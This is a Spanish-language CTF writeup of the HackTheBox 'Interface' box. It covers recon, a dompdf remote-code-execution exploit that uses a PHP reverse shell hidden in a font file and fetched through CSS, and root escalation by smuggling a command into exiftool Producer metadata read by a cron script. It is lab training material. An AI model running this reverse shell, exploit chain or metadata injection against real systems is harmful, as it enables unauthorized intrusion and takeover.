---
layout: single
title: Interface - HackTheBox
excerpt: " A box that sees a lot of fuzzing, plus exploits targeting 'dompdf' with relatively easy privilege escalation. "
date: 2023-02-13
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-interface/interface.png
  teaser_home_page: true
  icon: /blog/assets/images/htb.webp
categories:
  - hackthebox
tags:
  - dompdf
  - NextJS
  - api
  - exiftool
  - metadata
---

A box that sees a lot of fuzzing, plus exploits targeting "dompdf" with relatively easy privilege escalation.

# Summary
- IP: 10.129.154.5
- Ports: 22,80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
	-  80 -> nginx 1.14.0

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.154.5 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,80 -sCV 10.129.154.5 -oN targeted
```


# Análisis de página web:

- Al entrar a la página principal vemos un mensaje pero no nos sirve de nada, analizando el código fuente y haciendo un escaneo típico de directorios tampoco encontramos nada.

- Interceptamos la petición al entrar a la página con Burpsuite y optenemos la siguiente información contemplada dentro de la respuesta del servidor:


```http
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;
```


- Podemos apreciar un subdominio deconocido "prd.m.rendering-api.interface.htb"; lo agregamos al "/etc/hosts".

- Hacemos un escaneo de directorios:

```bash
$gobuster dir -u prd.m.rendering-api.interface.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

```
$ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50
```

Encontramos "/vendor" y "/api/html2pdf"

```bash
$gobuster dir -u prd.m.rendering-api.interface.htb/vendor -w /usr/share/dirb/wordlists/big.txt -t 100
```

Encontramos "/vendor/dompdf"

- Con esta información podemos deducir que la página implementa "dompf" por detrás, buscamos vulnerabilidades para esto y encontramos lo siguiente:

[Exploiting RCE Vulnerability in Dompdf | Optiv](https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf)

- Bingo! un RCE; llevamos a cabo el exploit.


# Exploit dompdf RCE:

- Primero, descargamos cualquier archivo font ".ttf" que encontremos por internet, y lo renombraremos a "exploit_font.php"; a este mismo archivo renombrado le agregamos una linea al final el cual contendrá el comando de la reverse shell:

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.129/443 0>&1'");?>
```

- Luego, creamos un archivo "exploit.css" con el siguiente contenido:

```
@font-face {
    font-family:'exploitfont';
    src:url('http://ipatacante/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
}
```

- Después de haber creado estos archivos, nos montamos un servidor http con python en el puerto 80 para que sean accesibles via web.

```bash
$python3 -m http.server 80
```

- Ahora, enviamos una POST request a /api/html2pdf (en este caso lo hice en el repeater de Burpsuite) con la siguiente estructura:

```http
POST /api/html2pdf HTTP/1.1
Host: prd.m.rendering-api.interface.htb
Content-Type: application/json
Content-Length: 79

{
 "html":"<link rel=stylesheet href='http://10.10.15.129:80/exploit.css'>"
}
```

- Hecho esto, debemos localizar el archivo que por detrás se subió, el cual sería el "exploit_font.php"; de acuerdo al artículo, lo podemos localizar en la ruta "/vendor/dompdf/dompdf/lib/fonts/" con un nombre pre formateado por el servidor.

- Para descifrar el nombre que se le adjudicó al archivo por detrás, primero debemos tener en cuenta que tendrá el siguiente formato:

```
exploitfont_normal_hashmd5.php
```

- Donde el "hashmd5" será el archivo "exploit_font.php" que hemos creado, para esto, convertimos en hash la URL que nos dirige a tal archivo:

```bash
$echo -n "http://yourip/exploit_font.php" | md5sum
```

- Obtenemos el hash, entonces el formato del archivo que se guardó por detrás del servidor quedaría de la siguiente manera:

```
exploitfont_normal_4e5e34308ba36fe6d12beda1473f05e5.php
```

- Nos ponemos en escucha por el puerto 443 en nuestra máquina atacante.

- Por último, enviamos una petición GET a la dirección del archivo, tomando en cuenta el formato que hemos armado:


```
GET /vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_4e5e34308ba36fe6d12beda1473f05e5.php cd HTTP/1.1
Host: prd.m.rendering-api.interface.htb
```

- Con todo esto, habremos ganado acceso al sistema como "www-data".


# ESCALANDO PRIVILEGIOS:


- Transferimos el binario de "pspy64" a la máquina víctima y escaneamos los procesos que se están ejecutando por detrás de la máquina, dándonos como resultado lo siguiente:

```bash
2023/02/14 04:35:05 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2023/02/14 04:36:01 CMD: UID=0     PID=5679   | /bin/bash /usr/local/sbin/cleancache.sh 
2023/02/14 04:36:01 CMD: UID=0     PID=5678   | /bin/sh -c /usr/local/sbin/cleancache.sh
```

- Como podemos ver, el usuario root (UID=0) está ejecutando la script "cleancache.sh" cada cierto tiempo, analizamos dicha script:

```bash
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```

- La script obtiene el valor de "producer" de los metadatos de los archivos alojados en el directorio  "/tmp" y lo compara con "dompdf".

- Dado que podemos controlar los metadatos de los archivos, podemos controlar qué es $meta_producer y podemos usarlo para inyectar comandos.

- Entonces creamos un archivo "pwned.sh" en un directorio en el que tengamos permisos de escritura, en este caso podemos hacerlo en "dev/shm/" y le damos permisos de ejecución:

```bash
$touch /dev/shm/pwned.sh
$nano /dev/shm/pwned.sh
```

```
chmod u+s /bin/bash
```

```bash
$chmod +x /dev/shm/pwned.sh
```

- Ahora creamos un archivo "pwned" en el directorio "/tmp" y modificamos los metadatos con el fin de que ejecute el comando de la script que cabamos de crear:

```bash
$touch /tmp/pwned
$exiftool -Producer='a[$(/dev/shm/pwned.sh>&2)]+42' /tmp/pwned
```

- Ejecutamos la script "cleancache.sh" dado que tenemos permisos de ejecución.

```bash
$./cleancache.sh
```

- Y por último ejecutamos la bash con privilegios y seremos root:

```bash
$bash -p
```
